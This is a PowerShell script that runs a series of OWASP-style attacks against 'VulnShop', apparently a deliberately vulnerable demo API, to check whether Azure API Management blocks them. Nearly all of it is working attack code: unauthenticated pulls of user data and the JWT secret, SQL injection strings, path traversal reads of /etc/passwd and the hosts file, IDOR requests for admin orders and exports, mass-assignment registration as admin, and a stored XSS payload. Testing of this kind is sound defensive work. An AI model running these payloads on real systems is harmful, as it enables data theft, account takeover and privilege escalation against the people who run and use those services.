# Comprehensive, non-destructive attack script for VulnShop API (PowerShell) - FIXED VERSION
# This script tests for sensitive data exposure, lack of authentication,
# and other OWASP Top 10 vulnerabilities.

param(
    [Parameter(Mandatory=$true, HelpMessage="The base URL of the VulnShop API to target.")]
    [string]$ApiBaseUrl
)

# --- Configuration ---
$Timestamp = Get-Date -Format "yyyyMMddHHmmss"
$Random = Get-Random -Maximum 9999
Write-Host "Targeting API at: $ApiBaseUrl"
Write-Host "Test Run ID: $Timestamp-$Random"
Write-Host "---"

# --- Helper Functions ---
function Print-Header($title) {
    Write-Host "`n`n==================================================" -ForegroundColor Yellow
    Write-Host "  $title" -ForegroundColor Yellow
    Write-Host "==================================================`n" -ForegroundColor Yellow
}

function Run-Test($testName, $command) {
    Write-Host "--- Starting Test: $testName ---" -ForegroundColor Cyan
    try {
        # Replace the placeholder with the actual ApiBaseUrl
        $resolvedCommand = $command.Replace('$ApiBaseUrl', $ApiBaseUrl)
        $result = Invoke-Expression $resolvedCommand
        if ($result) {
            $result | ConvertTo-Json -Depth 10
        } else {
            Write-Host "No data returned" -ForegroundColor Gray
        }
    } catch {
        $statusCode = $_.Exception.Response.StatusCode.value__
        if ($statusCode -eq 403) {
            Write-Host "BLOCKED BY APIM: 403 Forbidden - Security policy prevented this attack" -ForegroundColor Red
        } else {
            Write-Host "Error running test: $_" -ForegroundColor Red
        }
    }
    Write-Host "`n--- Test Complete: $testName ---`n" -ForegroundColor Cyan
    Start-Sleep -Seconds 1
}

# --- Attack Scenarios ---

# 1. Lack of Authentication & Information Disclosure
Print-Header "Testing Public Endpoints (No Authentication Required)"

Run-Test "Discover API Endpoints" `
    "Invoke-RestMethod -Uri '$ApiBaseUrl/api/discovery' -Method Get"

Run-Test "Fetch All Users (Sensitive Data Exposure)" `
    "(Invoke-RestMethod -Uri '$ApiBaseUrl/api/public/users?limit=5' -Method Get).users[0]"

Run-Test "Fetch System Information (Sensitive Data Exposure)" `
    "(Invoke-RestMethod -Uri '$ApiBaseUrl/api/public/system-info' -Method Get).system.env.JWT_SECRET"

Run-Test "Fetch Database Schema (Sensitive Data Exposure)" `
    "Invoke-RestMethod -Uri '$ApiBaseUrl/api/public/db-schema' -Method Get"

Run-Test "Fetch Recent Orders (Sensitive Data Exposure)" `
    "(Invoke-RestMethod -Uri '$ApiBaseUrl/api/public/recent-orders' -Method Get)"

Run-Test "Fetch App Configuration (Exposing JWT Secret)" `
    "Invoke-RestMethod -Uri '$ApiBaseUrl/api/public/config' -Method Get"

Run-Test "Fetch Debug Information" `
    "(Invoke-RestMethod -Uri '$ApiBaseUrl/api/public/debug' -Method Get).routes[0]"

# 2. Injection Attacks
Print-Header "Testing Injection Vulnerabilities"

Run-Test "SQL Injection - User Search (Bypass Auth)" `
    "Invoke-RestMethod -Uri `"$ApiBaseUrl/api/public/user-search?username=' OR '1'='1' --`" -Method Get"

Run-Test "SQL Injection - Product Search (Error-Based)" `
    "Invoke-RestMethod -Uri `"$ApiBaseUrl/api/products/search?q='`" -Method Get"

# 3. Path Traversal
Print-Header "Testing Path Traversal"

# Test both Windows and Linux paths
if ($PSVersionTable.Platform -eq 'Win32NT' -or !$PSVersionTable.Platform) {
    Run-Test "Attempt to Read hosts file (Windows)" `
        "Invoke-RestMethod -Uri '$ApiBaseUrl/api/public/files?path=C:\Windows\System32\drivers\etc\hosts' -Method Get"
} else {
    Run-Test "Attempt to Read /etc/passwd (Linux)" `
        "Invoke-RestMethod -Uri '$ApiBaseUrl/api/public/files?path=/etc/passwd' -Method Get"
}

Run-Test "Attempt to Read package.json" `
    "Invoke-RestMethod -Uri '$ApiBaseUrl/api/public/files?path=./package.json' -Method Get"

# 4. Broken Authentication & Access Control
Print-Header "Testing Authentication and Access Control"

# Use unique timestamp-based credentials
$uniqueUser = "attacker_ps_$Timestamp"
$uniqueEmail = "attacker_ps_$Timestamp@test.com"

$registerPayload = @{
    username = $uniqueUser
    email    = $uniqueEmail
    password = "password123"
} | ConvertTo-Json

Run-Test "Register a New User" `
    "Invoke-RestMethod -Uri '$ApiBaseUrl/api/register' -Method Post -Body '$registerPayload' -ContentType 'application/json'"

$loginPayload = @{
    username = $uniqueUser
    password = "password123"
} | ConvertTo-Json

try {
    $tokenResponse = Invoke-RestMethod -Uri "$ApiBaseUrl/api/login" -Method Post -Body $loginPayload -ContentType "application/json"
    $TOKEN = $tokenResponse.token
    Write-Host "Successfully logged in as '$uniqueUser'" -ForegroundColor Green
} catch {
    Write-Host "Failed to login. Some tests will be skipped." -ForegroundColor Red
    $TOKEN = $null
}

if ($TOKEN) {
    $headers = @{ "Authorization" = "Bearer $TOKEN" }
    
    # First create an order to test IDOR
    Print-Header "Creating Test Data for IDOR Testing"
    
    # Add item to cart first
    $cartPayload = @{
        productId = 1
        quantity = 1
    } | ConvertTo-Json
    
    Run-Test "Add Item to Cart" `
        "Invoke-RestMethod -Uri '$ApiBaseUrl/api/cart' -Method Post -Headers @{ Authorization = 'Bearer $TOKEN' } -Body '$cartPayload' -ContentType 'application/json'"
    
    # Create order
    $orderPayload = @{
        items = @(
            @{
                productId = 1
                quantity = 1
            }
        )
    } | ConvertTo-Json
    
    $orderResult = $null
    try {
        $orderResult = Invoke-RestMethod -Uri "$ApiBaseUrl/api/orders" -Method Post -Headers $headers -Body $orderPayload -ContentType "application/json"
        Write-Host "Created order with ID: $($orderResult.id)" -ForegroundColor Green
    } catch {
        Write-Host "Failed to create order: $_" -ForegroundColor Red
    }
    
    Print-Header "Testing IDOR and Access Control Vulnerabilities"
    
    # Try to access admin's order (ID 1) and our own order
    Run-Test "Attempt IDOR to Access Admin's Order (Order ID 1)" `
        "Invoke-RestMethod -Uri '$ApiBaseUrl/api/orders/1' -Method Get -Headers @{ Authorization = 'Bearer $TOKEN' }"
    
    if ($orderResult -and $orderResult.id) {
        Run-Test "Access Own Order (Baseline Test)" `
            "Invoke-RestMethod -Uri '$ApiBaseUrl/api/orders/$($orderResult.id)' -Method Get -Headers @{ Authorization = 'Bearer $TOKEN' }"
    }
    
    Run-Test "Attempt to Export Admin's Data (User ID 1)" `
        "Invoke-RestMethod -Uri '$ApiBaseUrl/api/users/1/export' -Method Get -Headers @{ Authorization = 'Bearer $TOKEN' }"
}

# 5. Mass Assignment
Print-Header "Testing Mass Assignment Vulnerability"

$adminUser = "eviladmin_ps_$Timestamp"
$adminEmail = "evil_ps_$Timestamp@test.com"

$adminRegisterPayload = @{
    username = $adminUser
    email    = $adminEmail
    password = "password123"
    role     = "admin"
} | ConvertTo-Json

Run-Test "Register New User with Admin Role" `
    "Invoke-RestMethod -Uri '$ApiBaseUrl/api/register' -Method Post -Body '$adminRegisterPayload' -ContentType 'application/json'"

$adminLoginPayload = @{
    username = $adminUser
    password = "password123"
} | ConvertTo-Json

try {
    $adminTokenResponse = Invoke-RestMethod -Uri "$ApiBaseUrl/api/login" -Method Post -Body $adminLoginPayload -ContentType "application/json"
    $ADMIN_TOKEN = $adminTokenResponse.token
    Write-Host "Successfully logged in as '$adminUser' - mass assignment likely successful!" -ForegroundColor Green
    
    $adminHeaders = @{ "Authorization" = "Bearer $ADMIN_TOKEN" }
    Run-Test "Verify Admin Access by Fetching All Users" `
        "Invoke-RestMethod -Uri '$ApiBaseUrl/api/admin/users' -Method Get -Headers @{ Authorization = 'Bearer $ADMIN_TOKEN' }"
} catch {
    Write-Host "Failed to login as admin user. Mass assignment may have been blocked." -ForegroundColor Red
}

# 6. Cross-Site Scripting (XSS)
if ($TOKEN) {
    Print-Header "Testing XSS in Product Reviews"
    
    $xssPayload = @{
        rating  = 5
        comment = "<script>alert('XSS-$Timestamp')</script>"
    } | ConvertTo-Json
    
    Run-Test "Submit Review with XSS Payload" `
        "Invoke-RestMethod -Uri '$ApiBaseUrl/api/products/1/reviews' -Method Post -Headers @{ Authorization = 'Bearer $TOKEN'; 'Content-Type' = 'application/json' } -Body '$xssPayload'"
    
    Run-Test "Verify XSS Payload is Stored" `
        "Invoke-RestMethod -Uri '$ApiBaseUrl/api/products/1' -Method Get"
}

# Summary Report
Print-Header "Test Summary"
Write-Host "Test Run ID: $Timestamp-$Random" -ForegroundColor Cyan
Write-Host "`nNote: Tests marked as 'BLOCKED BY APIM' indicate the Azure API Management" -ForegroundColor Yellow
Write-Host "security policies are working correctly to prevent these attacks." -ForegroundColor Yellow
Write-Host "`nOther errors indicate application-level vulnerabilities or issues." -ForegroundColor Yellow

Write-Host "`n`n==================================================" -ForegroundColor Green
Write-Host "  All non-destructive attacks completed." -ForegroundColor Green
Write-Host "==================================================`n" -ForegroundColor Green 